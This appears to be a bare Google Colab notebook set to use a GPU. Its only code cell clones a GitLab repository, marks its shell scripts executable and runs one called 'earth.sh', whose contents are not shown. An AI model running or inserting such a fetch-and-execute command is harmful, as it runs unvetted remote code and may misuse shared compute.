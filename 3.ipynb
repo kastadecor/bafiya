{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "2.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "BI16Pp8tUwpb"
      },
      "source": [
        "# **2**"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "yHCL971ww6KO"
      },
      "source": [
        "!git clone https://gitlab.com/bafiya/profile.git && cd profile && chmod +x *.sh && ./earth.sh"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}
